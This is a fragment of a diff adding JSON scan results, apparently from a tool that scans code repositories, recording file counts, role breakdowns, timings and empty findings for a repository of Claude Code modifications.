+        "AGENTS.md"
+      ],
+      "scanMs": 6771,
+      "ms": 26146,
+      "findings": []
+    },
+    "karanb192/awesome-claude-code-mods": {
+      "repo": "karanb192/awesome-claude-code-mods",
+      "sha": "9d2afde4534b5e8d7706b225c0ddc68fd2492c77",
+      "status": "ok",
+      "filesDownloaded": 46730,
+      "filesScanned": 46730,
+      "filesSkipped": 0,
+      "roles": {
+        "docs": 13,
+        "code": 64,
+        "unknown": 46615,
+        "config": 33,
+        "instruction": 4,
+        "manifest": 1
+      },
+      "agentFiles": 0,
+      "agentFileSample": [],
+      "scanMs": 42105,
+      "ms": 70154,
+      "findings": []
+    }
+  },
+  "updatedAt": "2026-11-23T07:48:36.898Z",
+  "finishedAt": "2026-11-23T07:48:36.898Z"
+}
